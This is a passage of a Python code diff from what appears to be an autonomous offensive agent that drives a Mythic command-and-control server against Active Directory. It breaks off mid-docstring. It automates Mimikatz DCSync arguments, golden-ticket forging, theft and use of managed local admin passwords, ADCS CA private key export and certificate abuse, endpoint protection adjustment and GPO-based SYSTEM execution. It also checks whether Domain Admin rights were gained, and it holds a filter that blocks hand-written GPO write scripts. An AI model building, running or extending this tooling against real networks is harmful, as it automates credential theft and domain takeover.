+            acct = u.split("@", 1)[0].strip()
+        else:
+            acct = u
+        if not acct:
+            return u
+        return f"{netbios}\\{acct}" if netbios else acct
+
+    def _qualify_mimikatz_dcsync_string(self, s: str) -> str:
+        """Normalize the /user value inside an `lsadump::dcsync /domain:X /user:Y ...` argument string."""
+        dm = re.search(r"/domain:([A-Za-z0-9._-]+)", s)
+        if not dm:
+            return s
+        dom = dm.group(1)
+        return re.sub(r"/user:([^\s]+)", lambda mm: f"/user:{self._normalize_dcsync_user(mm.group(1), dom)}", s)
+
+    def _looks_like_dcsync_params(self, command, p) -> bool:
+        if "dcsync" in _normalize_command_name(command):
+            return True
+        blob = (json.dumps(p) if isinstance(p, dict) else str(p)).casefold()
+        if "dcsync" in blob or "lsadump" in blob:
+            return True
+        keys = {k.lower() for k in p.keys()} if isinstance(p, dict) else set()
+        return "user" in keys and "domain" in keys and "dc" in keys  # {Domain,User,DC} mimikatz-via-execute_pe shape
+
+    def _qualify_dcsync_params(self, command, parameters):
+        """Normalize raw Mimikatz DCSync user values to NETBIOS\\sAMAccountName.
+
+        This includes native payload `dcsync` dictionaries. Apollo's native command wraps Mimikatz and still
+        emits `/user:<value>` internally, so a bare `krbtgt` reaches CrackNames ambiguously in multi-domain
+        forests and returns ERROR_NOT_UNIQUE.
+        """
+        command_name = _normalize_command_name(command)
+        is_str = isinstance(parameters, str)
+        p = parameters
+        if is_str:
+            s = parameters.strip()
+            try:
+                p = json.loads(s) if s.startswith("{") else None
+            except Exception:
+                p = None
+        if p is None or not isinstance(p, dict):
+            if isinstance(parameters, str) and "lsadump::dcsync" in parameters.casefold():
+                return self._qualify_mimikatz_dcsync_string(parameters)
+            return parameters
+        p = dict(p)
+        changed = False
+        for k, v in list(p.items()):
+            if isinstance(v, str) and "lsadump::dcsync" in v.casefold():
+                nv = self._qualify_mimikatz_dcsync_string(v)
+                if nv != v:
+                    p[k] = nv
+                    changed = True
+        if self._looks_like_dcsync_params(command, p):
+            ukey = next((k for k in p if k.lower() in ("user", "account")), None)
+            dkey = next((k for k in p if k.lower() == "domain"), None)
+            if ukey and isinstance(p.get(ukey), str) and p.get(ukey).strip():
+                dom = str(p.get(dkey) or "").strip() if dkey else ""
+                nu = self._normalize_dcsync_user(p[ukey], dom)
+                if nu != p[ukey]:
+                    p[ukey] = nu
+                    changed = True
+        if not changed:
+            return parameters
+        return json.dumps(p) if is_str else p
+
+    @staticmethod
+    def _rewrite_shell_like_run(command, parameters):
+        normalized_command = _normalize_command_name(command)
+        if normalized_command in {"powerpick", "powershell", "ps"}:
+            if isinstance(parameters, dict):
+                lowered_parameters = {str(k).casefold(): v for k, v in parameters.items()}
+                for key in ("command", "script", "powershell", "arguments", "args"):
+                    value = lowered_parameters.get(key)
+                    if isinstance(value, str) and value.strip():
+                        return command, value.strip()
+            return command, parameters
+        if normalized_command not in {"run", "shell"}:
+            return command, parameters
+
+        text = ""
+        lowered_parameters = {}
+        if isinstance(parameters, dict):
+            lowered_parameters = {str(k).casefold(): v for k, v in parameters.items()}
+            for key in ("command", "cmd", "shell", "arguments"):
+                value = lowered_parameters.get(key)
+                if isinstance(value, str) and value.strip():
+                    text = value.strip()
+                    break
+        elif isinstance(parameters, str):
+            text = parameters.strip()
+        if not text:
+            return command, parameters
+
+        if normalized_command == "shell":
+            return "shell", text
+
+        low = text.casefold()
+        if low.startswith("cmd.exe /c "):
+            return "shell", text[len("cmd.exe /c "):].strip()
+        if low.startswith("cmd /c "):
+            return "shell", text[len("cmd /c "):].strip()
+        first = low.split(None, 1)[0] if low.split(None, 1) else low
+        shell_builtins = {
+            "assoc", "break", "call", "cd", "chdir", "cls", "color", "copy", "date", "del", "dir",
+            "echo", "endlocal", "erase", "for", "ftype", "if", "md", "mkdir", "mklink", "move", "path",
+            "pause", "popd", "prompt", "pushd", "rd", "ren", "rename", "rmdir", "set", "setlocal",
+            "shift", "start", "time", "title", "type", "ver", "verify", "vol",
+        }
+        if first in shell_builtins or any(op in text for op in ("&&", "||", "|", ">", "<")):
+            return "shell", text
+        if "command" in lowered_parameters:
+            return "shell", text
+        return command, parameters
+
+    def _raw_gpo_mutation_blocker(self, command, parameters) -> str:
+        normalized_command = _normalize_command_name(command)
+        if normalized_command not in {"powerpick", "powershell", "ps", "shell", "run"}:
+            return ""
+        context = self._deterministic_capability_command_context(command, parameters)
+        if self._capability_text(context.get("capability")).casefold() == "gpo-controlled-system-exec":
+            return ""
+        text = self._capability_text(parameters)
+        if isinstance(parameters, dict):
+            try:
+                text = json.dumps(parameters, sort_keys=True, default=str)
+            except Exception:
+                text = str(parameters)
+        low = text.casefold()
+        gpo_markers = (
+            "scheduledtasks.xml",
+            "\\machine\\preferences\\scheduledtasks",
+            "gpcmachineextensionnames",
+            "cn=policies,cn=system",
+            "\\sysvol\\",
+            "gpt.ini",
+            "immediatetaskv2",
+        )
+        if not any(marker in low for marker in gpo_markers):
+            return ""
+        mutation_markers = (
+            "set-content",
+            "add-content",
+            "out-file",
+            "new-item",
+            "commitchanges",
+            "directoryattributemodification",
+            "modifyrequest",
+        )
+        compact = re.sub(r"\s+", "", low)
+        property_assignment = any(
+            marker in compact
+            for marker in (
+                "properties['versionnumber'].value=",
+                'properties["versionnumber"].value=',
+                "properties['gpcmachineextensionnames'].value=",
+                'properties["gpcmachineextensionnames"].value=',
+                ".properties['versionnumber'].value=",
+                '.properties["versionnumber"].value=',
+                ".properties['gpcmachineextensionnames'].value=",
+                '.properties["gpcmachineextensionnames"].value=',
+            )
+        )
+        if not (any(marker in low for marker in mutation_markers) or property_assignment):
+            return ""
+        return (
+            "STOP — raw GPO mutation scripts are blocked outside execute_capability/build_capability_commands. "
+            "Use execute_capability with capability='gpo-controlled-system-exec' so the deterministic adapter "
+            "owns GPP XML construction, CSE registration, computer-side version bumping, waiting, and proof-path "
+            "verification. Read-only GPO inspection is allowed; hand-written PowerShell that writes SYSVOL, "
+            "ScheduledTasks.xml, GPT.INI, gPCMachineExtensionNames, or versionNumber is not."
+        )
+
+    def _artifact_secret(self, prefix: str, slug: str = "") -> str:
+        """Per-run, non-source-visible password for a forged/exported offensive artifact (shared salt with
+        capabilities.artifact_secret so a forge step and its use step agree on the password)."""
+        try:
+            from . import capabilities as _caps
+        except ImportError:
+            import capabilities as _caps
+        return _caps.artifact_secret(prefix, slug)
+
+    def _extract_domain_admin_membership_probe(self, output, expected_domain=None) -> dict:
+        text = str(output or "")
+        low = text.casefold()
+        candidates = self._last_callback_identity_candidates()
+        member_present = any(_contains_identity_token(low, candidate) for candidate in candidates)
+        denied = any(marker in low for marker in (
+            "access is denied",
+            "system error 5",
+            "could not be found",
+            "not recognized",
+        ))
+        # Domain-correlated, deny-only-filtered group detection (drops the benign "command completed
+        # successfully" marker that previously let any successful command pass as a DA group query).
+        try:
+            from . import credential_artifacts as _ca
+        except ImportError:
+            import credential_artifacts as _ca
+        qualifying = _ca._qualifying_group_memberships(text, expected_domain=expected_domain)
+        group_query_succeeded = bool(
+            not denied and any(g.casefold() == "domain admins" for g in qualifying)
+        )
+        domain_admin = bool(group_query_succeeded and member_present)
+        return {
+            "domain_admin": domain_admin,
+            "group_query_succeeded": group_query_succeeded,
+            "member_of": ["Domain Admins"] if domain_admin else [],
+            "principal_present": member_present,
+            "principal_candidates": candidates,
+            "access_denied": denied,
+        }
+
+    def _last_callback_identity_candidates(self) -> list[str]:
+        callback_id = str(getattr(self, "_last_issued_callback_id", "") or "")
+        identity = ""
+        for foothold in list(getattr(self, "_engagement_footholds", []) or []):
+            if str(getattr(foothold, "callback_id", "")) == callback_id:
+                identity = str(getattr(foothold, "identity", "") or "")
+                break
+        out: list[str] = []
+        seen: set[str] = set()
+        for candidate in (
+            identity,
+            identity.rsplit("\\", 1)[-1] if "\\" in identity else "",
+            identity.split("@", 1)[0] if "@" in identity else "",
+        ):
+            normalized = candidate.strip().casefold()
+            if normalized and normalized not in seen:
+                seen.add(normalized)
+                out.append(normalized)
+        return out
+
+    def record_capability_result(self, action, probe_result, now: str | None = None, evidence: dict | None = None):
+        """Record a generic capability verifier result into the engagement ledger.
+
+        Live/probe helpers should call this after they have gathered structured
+        evidence. The method is deliberately side-effect narrow: it updates Sage's
+        hop ledger and persists it, but it does not issue Mythic tasks or infer
+        effects from prose.
+        """
+        try:
+            try:
+                from . import capabilities, engagement_state
+            except ImportError:
+                import capabilities
+                import engagement_state
+            now = now or datetime.now(timezone.utc).isoformat()
+            state = engagement_state.EngagementState(
+                objective=self._engagement_objective(),
+                footholds=list(getattr(self, "_engagement_footholds", []) or []),
+                hops=list(getattr(self, "_engagement_hops", []) or []),
+                graph_facts=list(getattr(self, "_engagement_graph_facts", []) or []),
+            )
+            updated, verification = capabilities.record_capability_result(
+                state,
+                action,
+                probe_result,
+                now,
+                evidence=evidence,
+            )
+            self._engagement_hops = updated.hops
+            try:
+                self._persist_engagement_ledger()
+            except Exception:
+                pass
+            return verification
+        except Exception as exc:
+            try:
+                from . import capabilities
+            except ImportError:
+                import capabilities
+            return capabilities.CapabilityVerification("failed", f"capability record failed: {exc}")
+
+    def _record_deterministic_capability_command_result(
+        self,
+        command: str,
+        parameters,
+        callback_display_id,
+        output: str,
+    ) -> None:
+        try:
+            context = getattr(self, "_deterministic_capability_command_contexts", {}).get(
+                _capability_command_key(command, parameters),
+                {},
+            )
+            if not context:
+                return
+            capability = self._capability_text(context.get("capability")).casefold()
+            expected_probe = self._capability_text(context.get("expected_probe")).casefold()
+            if capability == "ensure-account-kerberos-context" and expected_probe == "extract_account_ticket_cache_probe":
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                account = self._capability_text(intent.get("account") or intent.get("user")).casefold()
+                domain = self._capability_text(intent.get("domain") or intent.get("realm")).casefold()
+                if account and domain and self._ticket_cache_output_has_account(output, account, domain):
+                    self._kerberos_account_context_keys.add(
+                        self._kerberos_account_context_key(callback_display_id, account, domain)
+                    )
+                return
+            if capability == "gpo-controlled-system-exec":
+                if expected_probe != "extract_gpo_system_exec_probe":
+                    return
+                try:
+                    from . import capabilities
+                except ImportError:
+                    import capabilities
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                probe = dict(capabilities.extract_gpo_system_exec_probe(output))
+                probe["callback_id"] = self._capability_text(callback_display_id)
+                verification = capabilities.verify_capability(capability, probe)
+                if verification.verdict != "achieved":
+                    return
+                action = capabilities.CapabilityAction(
+                    name=self._capability_text(action_data.get("name") or capability),
+                    target=self._capability_text(action_data.get("target") or context.get("target")),
+                    preconditions=self._capability_list(action_data.get("preconditions")),
+                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                    reason=self._capability_text(action_data.get("reason")),
+                    source_facts=self._capability_list(action_data.get("source_facts")),
+                )
+                self.record_capability_result(
+                    action,
+                    probe,
+                    evidence={
+                        "source": "deterministic_capability_command",
+                        "provenance": "run",
+                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                        "callback_id": callback_display_id,
+                        "command": self._capability_text(command),
+                    },
+                )
+                return
+            if capability == "read-managed-local-admin-secret":
+                if expected_probe != "extract_managed_local_admin_secret_probe":
+                    return
+                try:
+                    from . import capabilities
+                except ImportError:
+                    import capabilities
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                target_host = self._capability_text(
+                    intent.get("target_host") or intent.get("host") or self._capability_target_host_from_context(context)
+                ).casefold()
+                target_domain = self._capability_text(
+                    intent.get("target_domain") or intent.get("domain") or self._capability_target_domain_from_context(context)
+                ).casefold()
+                account = self._capability_text(intent.get("account") or intent.get("user")).casefold()
+                account_domain = self._capability_text(
+                    intent.get("account_domain") or intent.get("reader_domain") or intent.get("principal_domain")
+                ).casefold()
+                probe = dict(capabilities.extract_managed_local_admin_secret_probe(output, target_host, target_domain))
+                probe["callback_id"] = self._capability_text(callback_display_id)
+                if account:
+                    probe["account"] = account
+                if account_domain:
+                    probe["account_domain"] = account_domain
+                verification = capabilities.verify_capability(capability, probe)
+                if verification.verdict != "achieved":
+                    return
+                action = capabilities.CapabilityAction(
+                    name=self._capability_text(action_data.get("name") or capability),
+                    target=self._capability_text(action_data.get("target") or context.get("target")),
+                    preconditions=self._capability_list(action_data.get("preconditions")),
+                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                    reason=self._capability_text(action_data.get("reason")),
+                    source_facts=self._capability_list(action_data.get("source_facts")),
+                )
+                self.record_capability_result(
+                    action,
+                    probe,
+                    evidence={
+                        "source": "deterministic_capability_command",
+                        "provenance": "run",
+                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                        "callback_id": callback_display_id,
+                        "command": self._capability_text(command),
+                    },
+                )
+                return
+            if capability == "use-managed-local-admin-secret":
+                if expected_probe != "extract_local_admin_access_probe":
+                    return
+                try:
+                    from . import capabilities
+                except ImportError:
+                    import capabilities
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                target_host = self._capability_text(
+                    intent.get("target_host") or intent.get("host") or self._capability_target_host_from_context(context)
+                ).casefold()
+                target_domain = self._capability_text(
+                    intent.get("target_domain") or intent.get("domain") or self._capability_target_domain_from_context(context)
+                ).casefold()
+                probe = dict(capabilities.extract_local_admin_access_probe(output, target_host, target_domain))
+                probe["callback_id"] = self._capability_text(callback_display_id)
+                verification = capabilities.verify_capability(capability, probe)
+                if verification.verdict != "achieved":
+                    return
+                action = capabilities.CapabilityAction(
+                    name=self._capability_text(action_data.get("name") or capability),
+                    target=self._capability_text(action_data.get("target") or context.get("target")),
+                    preconditions=self._capability_list(action_data.get("preconditions")),
+                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                    reason=self._capability_text(action_data.get("reason")),
+                    source_facts=self._capability_list(action_data.get("source_facts")),
+                )
+                self.record_capability_result(
+                    action,
+                    probe,
+                    evidence={
+                        "source": "deterministic_capability_command",
+                        "provenance": "run",
+                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                        "callback_id": callback_display_id,
+                        "command": self._capability_text(command),
+                    },
+                )
+                return
+            if capability == "execute-as-local-admin":
+                if expected_probe != "extract_remote_execution_probe":
+                    return
+                try:
+                    from . import capabilities
+                except ImportError:
+                    import capabilities
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
+                target_host = self._capability_text(
+                    intent.get("target_host")
+                    or intent.get("host")
+                    or runtime.get("target_host")
+                    or runtime.get("host")
+                    or self._capability_target_host_from_context(context)
+                ).casefold()
+                target_domain = self._capability_text(
+                    intent.get("target_domain")
+                    or intent.get("domain")
+                    or runtime.get("target_domain")
+                    or runtime.get("domain")
+                    or self._capability_target_domain_from_context(context)
+                ).casefold()
+                proof_marker = self._capability_text(intent.get("proof_marker") or runtime.get("proof_marker"))
+                probe = dict(capabilities.extract_remote_execution_probe(
+                    output,
+                    target_host,
+                    target_domain,
+                    proof_marker,
+                ))
+                probe["callback_id"] = self._capability_text(callback_display_id)
+                verification = capabilities.verify_capability(capability, probe)
+                if verification.verdict != "achieved":
+                    return
+                action = capabilities.CapabilityAction(
+                    name=self._capability_text(action_data.get("name") or capability),
+                    target=self._capability_text(action_data.get("target") or context.get("target")),
+                    preconditions=self._capability_list(action_data.get("preconditions")),
+                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                    reason=self._capability_text(action_data.get("reason")),
+                    source_facts=self._capability_list(action_data.get("source_facts")),
+                )
+                self.record_capability_result(
+                    action,
+                    probe,
+                    evidence={
+                        "source": "deterministic_capability_command",
+                        "provenance": "run",
+                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                        "callback_id": callback_display_id,
+                        "command": self._capability_text(command),
+                    },
+                )
+                return
+            if capability == "endpoint-protection-adjustment":
+                if expected_probe != "extract_endpoint_protection_probe":
+                    return
+                try:
+                    from . import capabilities
+                except ImportError:
+                    import capabilities
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
+                target_host = self._capability_text(
+                    intent.get("target_host")
+                    or intent.get("host")
+                    or runtime.get("target_host")
+                    or runtime.get("host")
+                    or self._capability_target_host_from_context(context)
+                ).casefold()
+                target_domain = self._capability_text(
+                    intent.get("target_domain")
+                    or intent.get("domain")
+                    or runtime.get("target_domain")
+                    or runtime.get("domain")
+                    or self._capability_target_domain_from_context(context)
+                ).casefold()
+                proof_marker = self._capability_text(
+                    intent.get("proof_marker")
+                    or intent.get("adjustment_marker")
+                    or runtime.get("proof_marker")
+                    or runtime.get("adjustment_marker")
+                )
+                probe = dict(capabilities.extract_endpoint_protection_probe(
+                    output,
+                    target_host,
+                    target_domain,
+                    proof_marker,
+                ))
+                probe["callback_id"] = self._capability_text(callback_display_id)
+                verification = capabilities.verify_capability(capability, probe)
+                if verification.verdict != "achieved":
+                    return
+                action = capabilities.CapabilityAction(
+                    name=self._capability_text(action_data.get("name") or capability),
+                    target=self._capability_text(action_data.get("target") or context.get("target")),
+                    preconditions=self._capability_list(action_data.get("preconditions")),
+                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                    reason=self._capability_text(action_data.get("reason")),
+                    source_facts=self._capability_list(action_data.get("source_facts")),
+                )
+                self.record_capability_result(
+                    action,
+                    probe,
+                    evidence={
+                        "source": "deterministic_capability_command",
+                        "provenance": "run",
+                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                        "callback_id": callback_display_id,
+                        "command": self._capability_text(command),
+                    },
+                )
+                return
+            if capability == "adcs-ca-private-key-export":
+                if expected_probe != "extract_adcs_ca_private_key_probe":
+                    return
+                try:
+                    from . import capabilities
+                except ImportError:
+                    import capabilities
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
+                target_host = self._capability_text(
+                    intent.get("target_host")
+                    or intent.get("host")
+                    or runtime.get("target_host")
+                    or runtime.get("host")
+                    or self._capability_target_host_from_context(context)
+                ).casefold()
+                target_domain = self._capability_text(
+                    intent.get("target_domain")
+                    or intent.get("domain")
+                    or runtime.get("target_domain")
+                    or runtime.get("domain")
+                    or self._capability_target_domain_from_context(context)
+                ).casefold()
+                proof_marker = self._capability_text(
+                    intent.get("proof_marker")
+                    or intent.get("export_marker")
+                    or runtime.get("proof_marker")
+                    or runtime.get("export_marker")
+                )
+                probe = dict(capabilities.extract_adcs_ca_private_key_probe(
+                    output,
+                    target_host,
+                    target_domain,
+                    proof_marker,
+                ))
+                probe["callback_id"] = self._capability_text(callback_display_id)
+                verification = capabilities.verify_capability(capability, probe)
+                if verification.verdict != "achieved":
+                    return
+                action = capabilities.CapabilityAction(
+                    name=self._capability_text(action_data.get("name") or capability),
+                    target=self._capability_text(action_data.get("target") or context.get("target")),
+                    preconditions=self._capability_list(action_data.get("preconditions")),
+                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                    reason=self._capability_text(action_data.get("reason")),
+                    source_facts=self._capability_list(action_data.get("source_facts")),
+                )
+                self.record_capability_result(
+                    action,
+                    probe,
+                    evidence={
+                        "source": "deterministic_capability_command",
+                        "provenance": "run",
+                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                        "callback_id": callback_display_id,
+                        "command": self._capability_text(command),
+                    },
+                )
+                return
+            if capability == "adcs-esc-certificate-enroll":
+                if expected_probe != "extract_adcs_enrolled_certificate_probe":
+                    return
+                try:
+                    from . import capabilities
+                except ImportError:
+                    import capabilities
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
+                account = self._capability_text(
+                    intent.get("account")
+                    or intent.get("user")
+                    or runtime.get("account")
+                    or runtime.get("user")
+                    or "administrator"
+                ).casefold()
+                domain = self._capability_text(
+                    intent.get("domain")
+                    or intent.get("target_domain")
+                    or runtime.get("domain")
+                    or runtime.get("target_domain")
+                    or self._capability_target_domain_from_context(context)
+                ).casefold()
+                proof_marker = self._capability_text(
+                    intent.get("proof_marker")
+                    or intent.get("enroll_marker")
+                    or runtime.get("proof_marker")
+                    or runtime.get("enroll_marker")
+                )
+                probe = dict(capabilities.extract_adcs_enrolled_certificate_probe(
+                    output,
+                    account,
+                    domain,
+                    proof_marker,
+                ))
+                probe["callback_id"] = self._capability_text(callback_display_id)
+                verification = capabilities.verify_capability(capability, probe)
+                if verification.verdict != "achieved":
+                    return
+                action = capabilities.CapabilityAction(
+                    name=self._capability_text(action_data.get("name") or capability),
+                    target=self._capability_text(action_data.get("target") or context.get("target")),
+                    preconditions=self._capability_list(action_data.get("preconditions")),
+                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                    reason=self._capability_text(action_data.get("reason")),
+                    source_facts=self._capability_list(action_data.get("source_facts")),
+                )
+                self.record_capability_result(
+                    action,
+                    probe,
+                    evidence={
+                        "source": "deterministic_capability_command",
+                        "provenance": "run",
+                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                        "callback_id": callback_display_id,
+                        "command": self._capability_text(command),
+                    },
+                )
+                return
+            if capability == "adcs-certificate-auth":
+                if expected_probe != "extract_adcs_certificate_auth_probe":
+                    return
+                try:
+                    from . import capabilities
+                except ImportError:
+                    import capabilities
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                runtime = context.get("runtime_inputs") if isinstance(context.get("runtime_inputs"), dict) else {}
+                account = self._capability_text(
+                    intent.get("account")
+                    or intent.get("user")
+                    or runtime.get("account")
+                    or runtime.get("user")
+                    or "administrator"
+                ).casefold()
+                domain = self._capability_text(
+                    intent.get("domain")
+                    or intent.get("target_domain")
+                    or runtime.get("domain")
+                    or runtime.get("target_domain")
+                    or self._capability_target_domain_from_context(context)
+                ).casefold()
+                proof_marker = self._capability_text(
+                    intent.get("proof_marker")
+                    or intent.get("auth_marker")
+                    or runtime.get("proof_marker")
+                    or runtime.get("auth_marker")
+                )
+                probe = dict(capabilities.extract_adcs_certificate_auth_probe(
+                    output,
+                    account,
+                    domain,
+                    proof_marker,
+                ))
+                probe["callback_id"] = self._capability_text(callback_display_id)
+                verification = capabilities.verify_capability(capability, probe)
+                if verification.verdict != "achieved":
+                    return
+                action = capabilities.CapabilityAction(
+                    name=self._capability_text(action_data.get("name") or capability),
+                    target=self._capability_text(action_data.get("target") or context.get("target")),
+                    preconditions=self._capability_list(action_data.get("preconditions")),
+                    effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                    intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                    verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                    reason=self._capability_text(action_data.get("reason")),
+                    source_facts=self._capability_list(action_data.get("source_facts")),
+                )
+                self.record_capability_result(
+                    action,
+                    probe,
+                    evidence={
+                        "source": "deterministic_capability_command",
+                        "provenance": "run",
+                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                        "callback_id": callback_display_id,
+                        "command": self._capability_text(command),
+                    },
+                )
+                return
+            if capability not in {
+                "forge-golden-ticket",
+                "ensure-kerberos-context",
+                "ensure-account-kerberos-context",
+            }:
+                return
+            if expected_probe not in {"extract_ticket_probe", "extract_account_ticket_probe"}:
+                return
+            try:
+                from . import capabilities, credential_artifacts
+            except ImportError:
+                import capabilities
+                import credential_artifacts
+            probe = dict(credential_artifacts.extract_ticket_probe(output))
+            probe["callback_id"] = self._capability_text(callback_display_id)
+            if capability == "ensure-account-kerberos-context":
+                action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+                intent = action_data.get("intent") if isinstance(action_data.get("intent"), dict) else {}
+                account = self._capability_text(intent.get("account") or intent.get("user")).casefold()
+                domain = self._capability_text(intent.get("domain") or intent.get("realm")).casefold()
+                if account:
+                    probe["account"] = account
+                if domain:
+                    probe["domain"] = domain
+                probe["account_ticket_present"] = self._kerberos_account_context_key(
+                    callback_display_id,
+                    account,
+                    domain,
+                ) in getattr(self, "_kerberos_account_context_keys", set())
+            verification = capabilities.verify_capability(capability, probe)
+            if verification.verdict != "achieved":
+                return
+            action_data = context.get("action") if isinstance(context.get("action"), dict) else {}
+            action = capabilities.CapabilityAction(
+                name=self._capability_text(action_data.get("name") or capability),
+                target=self._capability_text(action_data.get("target") or context.get("target")),
+                preconditions=self._capability_list(action_data.get("preconditions")),
+                effects=self._capability_list(action_data.get("effects")) or self._capability_list(context.get("effects")),
+                intent=dict(action_data.get("intent")) if isinstance(action_data.get("intent"), dict) else {},
+                verifier=dict(action_data.get("verifier")) if isinstance(action_data.get("verifier"), dict) else {},
+                reason=self._capability_text(action_data.get("reason")),
+                source_facts=self._capability_list(action_data.get("source_facts")),
+            )
+            self.record_capability_result(
+                action,
+                probe,
+                evidence={
+                    "source": "deterministic_capability_command",
+                    "provenance": "run",
+                    "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                    "callback_id": callback_display_id,
+                    "command": self._capability_text(command),
+                },
+            )
+        except Exception as exc:
+            try:
+                logger.info(f"🧭 [capability-record] deterministic command record skipped: {exc}")
+            except Exception:
+                pass
+
+    def build_capability_execution_plan(self, action, inputs: dict | None = None):
+        """Build deterministic, payload-agnostic execution steps for a capability action."""
+        try:
+            try:
+                from . import capabilities
+            except ImportError:
+                import capabilities
+            return capabilities.build_capability_execution_plan(action, inputs)
+        except Exception as exc:
+            try:
+                from . import capabilities
+            except ImportError:
+                import capabilities
+            return capabilities.CapabilityExecutionPlan(False, missing=["builder"], reason=str(exc))
+
+    async def build_capability_commands(
+        self,
+        action: Annotated[dict | str, (
+            "Capability action to build. Pass either a NEXT CAPABILITY ACTION dict "
+            "({name,target,intent,effects}) or a compact request such as "
+            "{\"capability\":\"forge-golden-ticket\",\"domain\":\"north.example.local\"} or "
+            "{\"capability\":\"ensure-kerberos-context\",\"domain\":\"root.example.local\","
+            "\"source_domain\":\"child.root.example.local\",\"callback_id\":\"7\"} or "
+            "{\"capability\":\"ensure-account-kerberos-context\",\"domain\":\"root.example.local\","
+            "\"account\":\"alice\",\"callback_id\":\"7\"} or "
+            "{\"capability\":\"read-managed-local-admin-secret\",\"account\":\"alice\","
+            "\"account_domain\":\"root.example.local\",\"target_host\":\"ws01\","
+            "\"target_domain\":\"child.example.local\",\"callback_id\":\"7\"} or "
+            "{\"capability\":\"use-managed-local-admin-secret\",\"target_host\":\"ws01\","
+            "\"target_domain\":\"child.example.local\",\"callback_id\":\"7\"} or "
+            "{\"capability\":\"execute-as-local-admin\",\"target_host\":\"ws01\","
+            "\"target_domain\":\"child.example.local\",\"callback_id\":\"7\"}."
+        )],
+        inputs: Annotated[dict | str | None, (
+            "Runtime values for the capability. For ticket/context capabilities include domain_sid and either "
+            "aes256/ntlm/key. If key is omitted, Sage reads Mythic credentials for krbtgt in the source "
+            "domain. For SID-history, pass target_domain and let Sage resolve source/parent domain SIDs "
+            "from BloodHound when possible. Explicit extra_sids or parent_domain_sid are accepted only with "
+            "trusted provenance. SIDs must be numeric Windows SIDs like S-1-5-21-111-222-333 or "
+            "S-1-5-21-111-222-333-519; GUID/objectId-shaped values are rejected. The builder emits a "
+            "ticket-artifact forge plus isolated Kerberos context/use/proof steps; do not request /ptt. "
+            "For account-context capabilities, pass account/domain/callback_id; Sage selects that account's "
+            "AES/NTLM key from Mythic credentials when omitted and proves access with a callback-scoped "
+            "ticket-store context. For managed-local-admin-secret reads, pass target_host/target_domain and "
+            "the reader account/domain; Sage resolves a target DC when possible and emits an LDAP read that "
+            "records only after plaintext managed password material is proven. For managed-local-admin-secret "
+            "use, pass password/secret or ensure a matching plaintext Mythic credential exists; Sage creates "
+            "an isolated NetOnly context and proves admin-share access before recording. For execute-as-local-admin, "
